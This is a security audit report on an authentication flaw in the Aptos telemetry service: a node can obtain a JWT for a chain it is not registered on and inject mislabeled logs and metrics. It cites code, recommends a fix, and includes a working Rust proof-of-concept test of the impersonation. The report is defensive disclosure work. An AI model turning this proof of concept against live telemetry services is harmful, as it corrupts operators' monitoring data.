# Audit Report

## Title
Cross-Chain Telemetry Impersonation via Unchecked Chain ID in Authentication Flow

## Summary
A node with valid credentials on Chain A can authenticate to the telemetry service claiming to be on Chain B, receiving a JWT token with the manipulated chain_id. This allows injection of logs and metrics tagged with the wrong chain identifier, compromising the integrity of the monitoring infrastructure.

## Finding Description

The authentication flow in the telemetry service fails to validate that a peer is actually authorized for the chain they claim to be on. The vulnerability exists in the authentication logic where:

1. During authentication, a client sends a request containing a `chain_id` and performs a Noise handshake [1](#0-0) 

2. If the peer is not found in the validator set for the claimed chain, the server only validates that the `peer_id` is correctly derived from the public key, then authenticates them as "Unknown" role [2](#0-1) 

3. A JWT token is created with the `chain_id` from the client's request body, not from any validated source [3](#0-2) 

4. This JWT is later used directly in `handle_log_ingest` where the `chain_id` from claims is used as a tag without additional validation [4](#0-3) 

5. Unknown node types are permitted to ingest logs [5](#0-4) 

**Attack Path:**
- Attacker operates a node with valid keypair on Chain A
- Attacker creates Noise handshake with Chain B in the prologue (using their own private key)
- Attacker sends auth request with `chain_id: Chain B` and their `peer_id`
- Server validates the Noise handshake (succeeds with Chain B prologue)
- Server looks up peer in Chain B validator set (fails - peer is not registered on Chain B)
- Server falls back to deriving peer_id from public key (succeeds)
- Server issues JWT with `chain_id: Chain B, node_type: Unknown`
- Attacker uses JWT to inject logs/metrics tagged as Chain B

The same vulnerability affects metrics ingestion where chain_id from claims is used to label metrics: [6](#0-5) 

## Impact Explanation

This vulnerability allows **monitoring data pollution** where logs and metrics from one chain can be mislabeled as belonging to another chain. While this does not directly affect blockchain consensus, state, or funds, it could:

1. Cause operational confusion for node operators
2. Compromise incident detection and response
3. Lead to incorrect analysis of chain health and performance
4. Potentially mask real issues on the actual chains

However, this is fundamentally a **telemetry infrastructure issue**, not a core blockchain protocol vulnerability. It does not affect:
- Consensus safety or liveness
- Transaction execution or state transitions
- Validator operations or staking
- On-chain governance
- Fund security

According to Aptos bug bounty severity categories, this appears to be a **Low Severity** issue (non-critical implementation bug) rather than High severity, as it doesn't cause validator node slowdowns, API crashes, or significant protocol violations.

## Likelihood Explanation

**Likelihood: Medium-High**

The attack is straightforward for any node operator to execute:
- Requires only a valid keypair (no special privileges)
- No complex cryptographic manipulation needed
- Works for any chain where the telemetry service has validator set data
- Can be automated and repeated continuously

The only constraint is that the target chain's validator set must be loaded in the telemetry service, which is typically true for all active chains the service monitors.

## Recommendation

Add validation to ensure that authenticated peers are actually authorized for the chain they claim. Specifically:

1. **Reject Unknown nodes from different chains**: Modify the authentication logic to only accept "Unknown" role authentication when the claimed chain_id matches the peer's actual registered chain, or reject cross-chain Unknown authentication entirely.

2. **Add chain-peer binding validation**: Maintain a mapping of which peers are authorized for which chains, and validate during authentication that the peer is authorized for the claimed chain.

3. **Separate authentication by chain**: Require separate authentication endpoints per chain, making cross-chain impersonation structurally impossible.

**Recommended code fix** (in `auth.rs`):

```rust
// After line 100, before returning Ok((*epoch, PeerRole::Unknown))
// Add validation that this peer has some prior relationship with this chain
// For example, check if they've ever authenticated for this chain before
// Or reject Unknown role for cross-chain requests entirely

// Option 1: Reject Unknown cross-chain authentication
return Err(reject::custom(ServiceError::forbidden(
    ServiceErrorCode::AuthError(
        AuthError::UnauthorizedChain,
        body.chain_id,
    ),
)));

// Option 2: Require peer to have authenticated at least once for this chain
// (implement chain-peer authorization tracking)
```

## Proof of Concept

```rust
#[tokio::test]
async fn test_cross_chain_impersonation() {
    use crate::tests::test_context::new_test_context;
    use aptos_config::config::{Peer, PeerRole, PeerSet};
    use aptos_crypto::{noise, x25519, Uniform};
    use aptos_types::{account_address, chain_id::ChainId, PeerId};
    use serde_json::json;
    
    let context = new_test_context().await;
    let server_public_key = context.inner.noise_config().public_key();
    
    // Setup: Node is registered on Chain 1
    let mut rng = rand::thread_rng();
    let attacker_key = x25519::PrivateKey::generate(&mut rng);
    let attacker_pub = attacker_key.public_key();
    let attacker_peer_id = account_address::from_identity_public_key(attacker_pub);
    let attacker_noise = noise::NoiseConfig::new(attacker_key);
    
    let chain_a = ChainId::new(1);
    let chain_b = ChainId::new(2);
    
    // Register attacker on Chain A
    let mut peer_set_a = PeerSet::new();
    peer_set_a.insert(attacker_peer_id, Peer::from_addrs(PeerRole::Validator, vec![]));
    context.inner.peers().validators().write().insert(chain_a, (1, peer_set_a));
    
    // Setup Chain B with empty peer set (attacker not registered here)
    context.inner.peers().validators().write().insert(chain_b, (1, PeerSet::new()));
    
    // Attack: Create handshake for Chain B (not Chain A)
    let mut client_noise_msg = vec![0; noise::handshake_init_msg_len(0)];
    const CHAIN_ID_LENGTH: usize = 1;
    const ID_SIZE: usize = CHAIN_ID_LENGTH + PeerId::LENGTH;
    const PROLOGUE_SIZE: usize = CHAIN_ID_LENGTH + PeerId::LENGTH + x25519::PUBLIC_KEY_SIZE;
    let mut prologue = [0; PROLOGUE_SIZE];
    prologue[..CHAIN_ID_LENGTH].copy_from_slice(&[chain_b.id()]); // Chain B!
    prologue[CHAIN_ID_LENGTH..ID_SIZE].copy_from_slice(attacker_peer_id.as_ref());
    prologue[ID_SIZE..PROLOGUE_SIZE].copy_from_slice(server_public_key.as_slice());
    
    let initiator_state = attacker_noise
        .initiate_connection(&mut rng, &prologue, server_public_key, None, &mut client_noise_msg)
        .unwrap();
    
    // Send auth request claiming to be on Chain B
    let req = json!({
        "chain_id": chain_b,  // Claiming Chain B
        "peer_id": attacker_peer_id,
        "role_type": "Validator",
        "server_public_key": server_public_key,
        "handshake_msg": client_noise_msg,
        "run_uuid": uuid::Uuid::new_v4(),
    });
    
    let resp = context.post("/api/v1/auth", req).await;
    
    // Attacker successfully gets JWT for Chain B
    // Decode JWT and verify it contains Chain B
    let auth_resp: crate::types::auth::AuthResponse = serde_json::from_value(resp).unwrap();
    let (response_payload, _) = attacker_noise
        .finalize_connection(initiator_state, &auth_resp.handshake_msg)
        .unwrap();
    let jwt = String::from_utf8(response_payload).unwrap();
    let decoded = context.inner.jwt_service().decode::<crate::types::auth::Claims>(&jwt).unwrap();
    
    // Vulnerability: JWT contains Chain B even though attacker is only registered on Chain A
    assert_eq!(decoded.claims.chain_id, chain_b);
    assert_eq!(decoded.claims.node_type, crate::types::common::NodeType::UnknownValidator);
    
    // Attacker can now use this JWT to inject logs/metrics tagged as Chain B
}
```

## Notes

While this is a valid exploitable vulnerability in the telemetry service authentication logic, it's important to note that:

1. **Scope Limitation**: This affects telemetry/monitoring infrastructure, not core blockchain consensus or state management
2. **Severity Assessment**: Based on Aptos bug bounty criteria, this appears to be Low severity (non-critical implementation bug) rather than the High severity claimed in the security question
3. **No Direct Protocol Impact**: The vulnerability doesn't affect transaction execution, consensus safety, validator operations, or fund security
4. **Operational Impact Only**: The harm is limited to monitoring data integrity and potential operational confusion

The validation checklist requirement for "Impact meets Critical, High, or Medium severity criteria" is not clearly satisfied, as this appears to be a Low severity issue per the bug bounty program definitions.

### Citations

**File:** crates/aptos-telemetry-service/src/auth.rs (L46-54)
```rust
    // build the prologue (chain_id | peer_id | public_key)
    const CHAIN_ID_LENGTH: usize = 1;
    const ID_SIZE: usize = CHAIN_ID_LENGTH + PeerId::LENGTH;
    const PROLOGUE_SIZE: usize = CHAIN_ID_LENGTH + PeerId::LENGTH + x25519::PUBLIC_KEY_SIZE;
    let mut prologue = [0; PROLOGUE_SIZE];
    prologue[..CHAIN_ID_LENGTH].copy_from_slice(&[body.chain_id.id()]);
    prologue[CHAIN_ID_LENGTH..ID_SIZE].copy_from_slice(body.peer_id.as_ref());
    prologue[ID_SIZE..PROLOGUE_SIZE].copy_from_slice(body.server_public_key.as_slice());

```

**File:** crates/aptos-telemetry-service/src/auth.rs (L88-101)
```rust
                None => {
                    // if not, verify that their peerid is constructed correctly from their public key
                    let derived_remote_peer_id =
                        aptos_types::account_address::from_identity_public_key(remote_public_key);
                    if derived_remote_peer_id != body.peer_id {
                        return Err(reject::custom(ServiceError::forbidden(
                            ServiceErrorCode::AuthError(
                                AuthError::PublicKeyMismatch,
                                body.chain_id,
                            ),
                        )));
                    } else {
                        Ok((*epoch, PeerRole::Unknown))
                    }
```

**File:** crates/aptos-telemetry-service/src/auth.rs (L137-144)
```rust
    let token = create_jwt_token(
        context.jwt_service(),
        body.chain_id,
        body.peer_id,
        node_type,
        epoch,
        body.run_uuid,
    )
```

**File:** crates/aptos-telemetry-service/src/log_ingest.rs (L27-33)
```rust
        .and(with_auth(context, vec![
            NodeType::Validator,
            NodeType::ValidatorFullNode,
            NodeType::PublicFullNode,
            NodeType::UnknownFullNode,
            NodeType::UnknownValidator,
        ]))
```

**File:** crates/aptos-telemetry-service/src/log_ingest.rs (L88-93)
```rust
    let chain_name = if claims.chain_id.id() == 3 {
        format!("{}", claims.chain_id.id())
    } else {
        format!("{}", claims.chain_id)
    };
    tags.insert(CHAIN_ID_TAG_NAME.into(), chain_name);
```

**File:** crates/aptos-telemetry-service/src/prometheus_push_metrics.rs (L158-163)
```rust
fn claims_to_extra_labels(claims: &Claims, common_name: Option<&String>) -> Vec<String> {
    let chain_name = if claims.chain_id.id() == 3 {
        format!("chain_name={}", claims.chain_id.id())
    } else {
        format!("chain_name={}", claims.chain_id)
    };
```
